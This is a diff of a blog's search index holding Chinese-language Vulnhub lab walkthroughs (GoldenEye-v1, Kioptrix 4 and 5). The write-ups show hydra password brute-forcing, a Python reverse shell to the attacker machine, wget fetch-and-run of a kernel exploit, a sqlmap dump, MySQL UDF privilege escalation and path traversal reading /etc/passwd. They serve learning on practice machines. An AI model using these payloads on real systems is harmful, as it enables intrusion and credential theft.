@@ -1,6 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>GoldenEye-v1</title>
+    <url>/2022/01/03/GoldenEye-v1/</url>
+    <content><![CDATA[<p><strong>靶机:192.168.12.132</strong><br><strong>kali:192.168.12.128</strong></p>
+<h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2><p><code>nmap -A -p- 192.168.12.132</code><br><img src="https://img-blog.csdnimg.cn/16683e8d03784c57a861efd9b53ced77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>查看80端口</strong><br><strong>web目录：/sev-home</strong><br><img src="https://img-blog.csdnimg.cn/7056d11cee7e402d9c0766f863656536.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>访问发现需要用户名和密码</strong><br><img src="https://img-blog.csdnimg.cn/d2b33bbde6334f1a92234e086171f53a.png" alt="请添加图片描述"><br><strong>查看源代码</strong><br><strong>terminal.js</strong><br><img src="https://img-blog.csdnimg.cn/2918af84788748f99f9e1e6a945c7cff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>访问terminal.js文件</strong><br><strong>一串unicode编码</strong><br><strong>Boris的password</strong><br><img src="https://img-blog.csdnimg.cn/d40bb4d7cf5f47c7b17e72a486d87bf2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><img src="https://img-blog.csdnimg.cn/dc7ed3d0b6db49a3afe87ba7834293c6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>得到：用户名/密码=<strong>boris/InvincibleHack3r</strong><br><strong>成功登陆</strong><br><img src="https://img-blog.csdnimg.cn/d1c206a2db344cfc8e58e2ccf442e12f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>查看源代码发现两个用户名</strong><br><strong>Natalya Boris</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/52c32d0437364270980e2ad7d35ce965.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>爆破密码</strong><br><code>hydra -l Boris -P /usr/share/wordlists/fasttrack.txt 192.168.12.132 -s 55007 pop3</code><br><img src="https://img-blog.csdnimg.cn/d89b48c65f374141a7c95ecd0cdfb6f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.12.132 -s 55007 pop3</code><br><img src="https://img-blog.csdnimg.cn/975bfd8462b546688c28a8034e96404a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>用户名：Boris<br>密码：secret1!</strong><br><strong>用户名：natalya<br>密码：bird</strong></p>
+<p><a href="https://www.cnblogs.com/caodneg7/p/10430734.html">pop3协议命令</a></p>
+<p><strong>Boris用户</strong><br><code>nc 192.168.12.132 55007</code><br><code>user Boris</code><br><code>pass secret1!</code><br><code>list</code><br><code>top 1</code><br><code>retr 1</code></p>
+<p><strong>natalya用户</strong><br><strong>同上操作登陆</strong><br><code>retr 2</code> <strong>第二个邮件发现用户名和密码</strong><br><strong>用户名：xenia<br>密码：RCP90rulez!</strong></p>
+<p><strong>提示我们修改hosts文件访问severnaya-station.com</strong><br><img src="https://img-blog.csdnimg.cn/4f0d49a1e9604f65b1f56c7020b9bac5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>gedit /etc/hosts</code>  <strong>修改hosts文件</strong><br><img src="https://img-blog.csdnimg.cn/7883a7d502f244d8af1b2d2909998e46.png" alt="请添加图片描述"><br><strong>访问后点击login</strong><br><img src="https://img-blog.csdnimg.cn/6fd655dd9b7f4a57863eb3808fae05ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><strong>成功登陆xenia用户</strong><br><strong>发现还有个doak用户</strong><br><img src="https://img-blog.csdnimg.cn/d712d6899e1d49b7b86c5154453ed895.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>再次爆破</strong><br><code>hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.12.132 -s 55007 pop3</code><br><img src="https://img-blog.csdnimg.cn/03f7080b802945729dd13000b9be0178.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>nc 192.168.12.132 55007</code> <strong>同上登陆doak用户</strong><br><code>retr 1</code><br>读取第一个邮件发现<br><strong>用户：dr_doak<br>密码：4England!</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/e5184948acf64986aae0ee951f715762.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>登陆dr_doak用户发现txt文件</strong><br><img src="https://img-blog.csdnimg.cn/d8f5ca62b4e2405891b901592bba72ca.png" alt="请添加图片描述"><br><strong>敏感目录：/dir007key/for-007.jpg</strong><br><img src="https://img-blog.csdnimg.cn/a3745195658a4618be25c89fc5d22c8b.png" alt="请添加图片描述"><br><strong>一串base64</strong><br><img src="https://img-blog.csdnimg.cn/cb51f660add547a18cc7a9a05f99c538.png" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/3a427efd59f9482ba09e9f4a07daaf53.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_17,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>试下发现是admin的密码</strong><br><strong>用户：admin<br>密码：xWinter1995x!</strong></p>
+<p><strong>登陆admin用户</strong></p>
+<h2 id="二、Getshell-moodle"><a href="#二、Getshell-moodle" class="headerlink" title="二、Getshell(moodle)"></a>二、Getshell(moodle)</h2><p><strong>我的是msf6<br>旧版本的应该可以msf直接弹shell(我没试)</strong><br><img src="https://img-blog.csdnimg.cn/a5c0352a90f543fdb82e8c328126397b.png" alt="请添加图片描述"><br><strong>修改拼写引擎</strong><br><img src="https://img-blog.csdnimg.cn/ea29b5b4e8fc46e1aed93ffa524431d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.12.128&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code>  <strong>–弹shell的payload</strong><br><img src="https://img-blog.csdnimg.cn/93a733a5d3b34ec9ad5d168b4d74f1ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>nc -lvp 4444</code> <strong>监听4444端口</strong><br><strong>点击拼写检查</strong><br><img src="https://img-blog.csdnimg.cn/52c65384162948c8b67561968db4308d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><strong>成功弹shell</strong><br><img src="https://img-blog.csdnimg.cn/48c2f5c67c334c32b54834e1d0c0e8bb.png" alt="请添加图片描述"></p>
+<h2 id="三、提权-linux-ubuntu-3-13-0"><a href="#三、提权-linux-ubuntu-3-13-0" class="headerlink" title="三、提权(linux ubuntu 3.13.0)"></a>三、提权(linux ubuntu 3.13.0)</h2><p><code>uname -a</code> <strong>查看内核版本</strong><br><img src="https://img-blog.csdnimg.cn/e7f05ddf942b4b3086c9db6c1c9470a7.png" alt="请添加图片描述"><code>searchsploit linux ubuntu 3.13.0</code> <strong>查找有无可利用漏洞</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/ca1d9448237e420aa633aa11d329d78b.png" alt="请添加图片描述"><code>searchsploit -p 37292.c</code> <strong>查看路径</strong><br><img src="https://img-blog.csdnimg.cn/151a145584ce46b08b8f5fd2cf5340de.png" alt="请添加图片描述"><br><strong>靶机没有gcc 改为cc</strong><br><img src="https://img-blog.csdnimg.cn/632aed68f9f94b6ab83a1606a6016f19.png" alt="请添加图片描述"><br><code>python -m SimpleHTTPServer 8000</code><br><code>wget 192.168.12.128:8000/37292.c</code><br><code>gcc 37292.c -o exp</code> <strong>编译</strong><br><code>./exp</code> <strong>运行即可</strong><br><img src="https://img-blog.csdnimg.cn/1cc4209c381d4d11824a5a25e827a1b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>成功root</strong></p>
+]]></content>
+      <categories>
+        <category>Vulnhub系列</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Kioptix Level 2</title>
     <url>/2021/12/05/Kioptrix-Level-2/</url>
     <content><![CDATA[<p><strong>靶机: 192.168.249.130<br>kali: 192.168.249.129</strong></p>
@@ -42,20 +65,37 @@
       </tags>
   </entry>
   <entry>
-    <title>GoldenEye-v1</title>
-    <url>/2022/01/03/GoldenEye-v1/</url>
-    <content><![CDATA[<p><strong>靶机:192.168.12.132</strong><br><strong>kali:192.168.12.128</strong></p>
-<h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2><p><code>nmap -A -p- 192.168.12.132</code><br><img src="https://img-blog.csdnimg.cn/16683e8d03784c57a861efd9b53ced77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>查看80端口</strong><br><strong>web目录：/sev-home</strong><br><img src="https://img-blog.csdnimg.cn/7056d11cee7e402d9c0766f863656536.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>访问发现需要用户名和密码</strong><br><img src="https://img-blog.csdnimg.cn/d2b33bbde6334f1a92234e086171f53a.png" alt="请添加图片描述"><br><strong>查看源代码</strong><br><strong>terminal.js</strong><br><img src="https://img-blog.csdnimg.cn/2918af84788748f99f9e1e6a945c7cff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>访问terminal.js文件</strong><br><strong>一串unicode编码</strong><br><strong>Boris的password</strong><br><img src="https://img-blog.csdnimg.cn/d40bb4d7cf5f47c7b17e72a486d87bf2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><img src="https://img-blog.csdnimg.cn/dc7ed3d0b6db49a3afe87ba7834293c6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>得到：用户名/密码=<strong>boris/InvincibleHack3r</strong><br><strong>成功登陆</strong><br><img src="https://img-blog.csdnimg.cn/d1c206a2db344cfc8e58e2ccf442e12f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>查看源代码发现两个用户名</strong><br><strong>Natalya Boris</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/52c32d0437364270980e2ad7d35ce965.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>爆破密码</strong><br><code>hydra -l Boris -P /usr/share/wordlists/fasttrack.txt 192.168.12.132 -s 55007 pop3</code><br><img src="https://img-blog.csdnimg.cn/d89b48c65f374141a7c95ecd0cdfb6f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.12.132 -s 55007 pop3</code><br><img src="https://img-blog.csdnimg.cn/975bfd8462b546688c28a8034e96404a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>用户名：Boris<br>密码：secret1!</strong><br><strong>用户名：natalya<br>密码：bird</strong></p>
-<p><a href="https://www.cnblogs.com/caodneg7/p/10430734.html">pop3协议命令</a></p>
-<p><strong>Boris用户</strong><br><code>nc 192.168.12.132 55007</code><br><code>user Boris</code><br><code>pass secret1!</code><br><code>list</code><br><code>top 1</code><br><code>retr 1</code></p>
-<p><strong>natalya用户</strong><br><strong>同上操作登陆</strong><br><code>retr 2</code> <strong>第二个邮件发现用户名和密码</strong><br><strong>用户名：xenia<br>密码：RCP90rulez!</strong></p>
-<p><strong>提示我们修改hosts文件访问severnaya-station.com</strong><br><img src="https://img-blog.csdnimg.cn/4f0d49a1e9604f65b1f56c7020b9bac5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>gedit /etc/hosts</code>  <strong>修改hosts文件</strong><br><img src="https://img-blog.csdnimg.cn/7883a7d502f244d8af1b2d2909998e46.png" alt="请添加图片描述"><br><strong>访问后点击login</strong><br><img src="https://img-blog.csdnimg.cn/6fd655dd9b7f4a57863eb3808fae05ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><strong>成功登陆xenia用户</strong><br><strong>发现还有个doak用户</strong><br><img src="https://img-blog.csdnimg.cn/d712d6899e1d49b7b86c5154453ed895.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>再次爆破</strong><br><code>hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.12.132 -s 55007 pop3</code><br><img src="https://img-blog.csdnimg.cn/03f7080b802945729dd13000b9be0178.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>nc 192.168.12.132 55007</code> <strong>同上登陆doak用户</strong><br><code>retr 1</code><br>读取第一个邮件发现<br><strong>用户：dr_doak<br>密码：4England!</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/e5184948acf64986aae0ee951f715762.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>登陆dr_doak用户发现txt文件</strong><br><img src="https://img-blog.csdnimg.cn/d8f5ca62b4e2405891b901592bba72ca.png" alt="请添加图片描述"><br><strong>敏感目录：/dir007key/for-007.jpg</strong><br><img src="https://img-blog.csdnimg.cn/a3745195658a4618be25c89fc5d22c8b.png" alt="请添加图片描述"><br><strong>一串base64</strong><br><img src="https://img-blog.csdnimg.cn/cb51f660add547a18cc7a9a05f99c538.png" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/3a427efd59f9482ba09e9f4a07daaf53.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_17,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>试下发现是admin的密码</strong><br><strong>用户：admin<br>密码：xWinter1995x!</strong></p>
-<p><strong>登陆admin用户</strong></p>
-<h2 id="二、Getshell-moodle"><a href="#二、Getshell-moodle" class="headerlink" title="二、Getshell(moodle)"></a>二、Getshell(moodle)</h2><p><strong>我的是msf6<br>旧版本的应该可以msf直接弹shell(我没试)</strong><br><img src="https://img-blog.csdnimg.cn/a5c0352a90f543fdb82e8c328126397b.png" alt="请添加图片描述"><br><strong>修改拼写引擎</strong><br><img src="https://img-blog.csdnimg.cn/ea29b5b4e8fc46e1aed93ffa524431d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.12.128&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code>  <strong>–弹shell的payload</strong><br><img src="https://img-blog.csdnimg.cn/93a733a5d3b34ec9ad5d168b4d74f1ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>nc -lvp 4444</code> <strong>监听4444端口</strong><br><strong>点击拼写检查</strong><br><img src="https://img-blog.csdnimg.cn/52c65384162948c8b67561968db4308d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><strong>成功弹shell</strong><br><img src="https://img-blog.csdnimg.cn/48c2f5c67c334c32b54834e1d0c0e8bb.png" alt="请添加图片描述"></p>
-<h2 id="三、提权-linux-ubuntu-3-13-0"><a href="#三、提权-linux-ubuntu-3-13-0" class="headerlink" title="三、提权(linux ubuntu 3.13.0)"></a>三、提权(linux ubuntu 3.13.0)</h2><p><code>uname -a</code> <strong>查看内核版本</strong><br><img src="https://img-blog.csdnimg.cn/e7f05ddf942b4b3086c9db6c1c9470a7.png" alt="请添加图片描述"><code>searchsploit linux ubuntu 3.13.0</code> <strong>查找有无可利用漏洞</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/ca1d9448237e420aa633aa11d329d78b.png" alt="请添加图片描述"><code>searchsploit -p 37292.c</code> <strong>查看路径</strong><br><img src="https://img-blog.csdnimg.cn/151a145584ce46b08b8f5fd2cf5340de.png" alt="请添加图片描述"><br><strong>靶机没有gcc 改为cc</strong><br><img src="https://img-blog.csdnimg.cn/632aed68f9f94b6ab83a1606a6016f19.png" alt="请添加图片描述"><br><code>python -m SimpleHTTPServer 8000</code><br><code>wget 192.168.12.128:8000/37292.c</code><br><code>gcc 37292.c -o exp</code> <strong>编译</strong><br><code>./exp</code> <strong>运行即可</strong><br><img src="https://img-blog.csdnimg.cn/1cc4209c381d4d11824a5a25e827a1b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>成功root</strong></p>
+    <title>Kioptrix Level 4</title>
+    <url>/2021/12/09/Kioptrix-Level-4/</url>
+    <content><![CDATA[<p><strong>靶机：192.168.249.133</strong><br><strong>kali:192.168.249.132</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.133</code> <strong>—查看开放端口</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/1.png"></p>
+<p><strong>—查看下80端口—</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/2.png"></p>
+<p><strong>—是个登录框可能猜测sql注入漏洞—</strong></p>
+<p><strong>—在用户名和密码处*标记，sqlmap跑一下</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/3.png"></p>
+<p><code>sqlmap -r 1.txt --level 3 -risk 2 --batch -D members -T members -C password,username --dump</code><strong>—爆出用户名john密码MyNameIsJohn</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/4.png"></p>
+<p><code>ssh john@192.168.249.133</code><strong>—–得到账号密码,先尝试ssh连接下</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/5.png"></p>
+<p><strong>—-可以连接但发现很多命令没法执行—</strong></p>
+<h4 id="二、逃逸受限shell"><a href="#二、逃逸受限shell" class="headerlink" title="二、逃逸受限shell"></a>二、逃逸受限shell</h4><p><a href="https://www.lshack.cn/653/" title="逃逸linux各种shell执行命令">逃逸linux各种shell执行命令</a></p>
+<p><code>echo os.system(&quot;/bin/bash&quot;)</code> <strong>–echo命令逃逸受限shell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/6.png"></p>
+<h4 id="三、权限提升-mysql-udf提权"><a href="#三、权限提升-mysql-udf提权" class="headerlink" title="三、权限提升(mysql udf提权)"></a>三、权限提升(mysql udf提权)</h4><p><code>uname -a</code> <strong>–先查看下内核</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/7.png"></p>
+<p><strong>–显然可以脏牛提权,但没有gcc—</strong></p>
+<p><code>cat /etc/passwd</code> –<strong>查看系统用户配置文件发现john和robert用户默认使用kshell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/8.png"></p>
+<p><code>ps -ef</code> <strong>-查看下进程</strong><br><img src="/2021/12/09/Kioptrix-Level-4/9.png"></p>
+<p><strong>–发现mysql是root权限–</strong></p>
+<p><code>mysql -u root</code>  <strong>–root无密码即可登录</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/10.png"></p>
+<p><strong>–学到了<font color="red">mysql udf提权</font>—</strong></p>
+<p><code>select * from func;</code> <strong>–发现有执行命令函数</strong><br><img src="/2021/12/09/Kioptrix-Level-4/11.png"></p>
+<p><strong>—可以赋予john用户root权限</strong></p>
+<p><code>select sys_exec(&#39;usermod -a -G admin john&#39;);</code> <strong>–赋予权限</strong></p>
+<p><code>sudo su</code> <strong>–输入john密码即拥有root权限</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/12.png"></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
@@ -101,37 +141,51 @@
       </tags>
   </entry>
   <entry>
-    <title>Kioptrix Level 4</title>
-    <url>/2021/12/09/Kioptrix-Level-4/</url>
-    <content><![CDATA[<p><strong>靶机：192.168.249.133</strong><br><strong>kali:192.168.249.132</strong></p>
-<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.133</code> <strong>—查看开放端口</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/1.png"></p>
-<p><strong>—查看下80端口—</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/2.png"></p>
-<p><strong>—是个登录框可能猜测sql注入漏洞—</strong></p>
-<p><strong>—在用户名和密码处*标记，sqlmap跑一下</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/3.png"></p>
-<p><code>sqlmap -r 1.txt --level 3 -risk 2 --batch -D members -T members -C password,username --dump</code><strong>—爆出用户名john密码MyNameIsJohn</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/4.png"></p>
-<p><code>ssh john@192.168.249.133</code><strong>—–得到账号密码,先尝试ssh连接下</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/5.png"></p>
-<p><strong>—-可以连接但发现很多命令没法执行—</strong></p>
-<h4 id="二、逃逸受限shell"><a href="#二、逃逸受限shell" class="headerlink" title="二、逃逸受限shell"></a>二、逃逸受限shell</h4><p><a href="https://www.lshack.cn/653/" title="逃逸linux各种shell执行命令">逃逸linux各种shell执行命令</a></p>
-<p><code>echo os.system(&quot;/bin/bash&quot;)</code> <strong>–echo命令逃逸受限shell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/6.png"></p>
-<h4 id="三、权限提升-mysql-udf提权"><a href="#三、权限提升-mysql-udf提权" class="headerlink" title="三、权限提升(mysql udf提权)"></a>三、权限提升(mysql udf提权)</h4><p><code>uname -a</code> <strong>–先查看下内核</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/7.png"></p>
-<p><strong>–显然可以脏牛提权,但没有gcc—</strong></p>
-<p><code>cat /etc/passwd</code> –<strong>查看系统用户配置文件发现john和robert用户默认使用kshell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/8.png"></p>
-<p><code>ps -ef</code> <strong>-查看下进程</strong><br><img src="/2021/12/09/Kioptrix-Level-4/9.png"></p>
-<p><strong>–发现mysql是root权限–</strong></p>
-<p><code>mysql -u root</code>  <strong>–root无密码即可登录</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/10.png"></p>
-<p><strong>–学到了<font color="red">mysql udf提权</font>—</strong></p>
-<p><code>select * from func;</code> <strong>–发现有执行命令函数</strong><br><img src="/2021/12/09/Kioptrix-Level-4/11.png"></p>
-<p><strong>—可以赋予john用户root权限</strong></p>
-<p><code>select sys_exec(&#39;usermod -a -G admin john&#39;);</code> <strong>–赋予权限</strong></p>
-<p><code>sudo su</code> <strong>–输入john密码即拥有root权限</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/12.png"></p>
+    <title>Kioptix Level 5</title>
+    <url>/2021/12/12/Kioptrix-Level-5/</url>
+    <content><![CDATA[<p><strong>靶机：192.168.249.134</strong><br><strong>kali:  192.168.249.132</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>ufs:/dev/ada0p2</code>  —<strong>指定根分区启动系统 这样指定根分区启动成功</strong>    </p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/1.png"></p>
+<p><strong>–靶机变为login才算打开—</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/2.png"></p>
+<p><code>nmap -sV 192.168.249.134</code> <strong>—查看开放端口</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/3.png"></p>
+<p><strong>—访问下80端口—</strong><br><strong>&lt;查看源代码&gt;</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/4.png"></p>
+<p><strong>&lt;看到URL访问下&gt;</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/6.png"></p>
+<p><strong>—搜下有无<font color="red">pChart 2.1.3的漏洞</font>—</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/5.png"></p>
+<p><strong>&lt;貌似是个目录遍历漏洞和xss,看下exp怎么利用&gt;</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/7.png"><br><img src="/2021/12/12/Kioptrix-Level-5/8.png"></p>
+<p>先玩玩XSS,刚开始以为是反射型<br>测试了下,发现是存储型,插几次,访问这个session.php就会弹几次窗.</p>
+<h4 id="二、0x00漏洞利用-pChart-2-1-3目录遍历"><a href="#二、0x00漏洞利用-pChart-2-1-3目录遍历" class="headerlink" title="二、0x00漏洞利用(pChart 2.1.3目录遍历)"></a>二、0x00漏洞利用(pChart 2.1.3目录遍历)</h4><p><code>http://192.168.249.134/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</code>—<strong>读取/etc/passwd</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/18.png"></p>
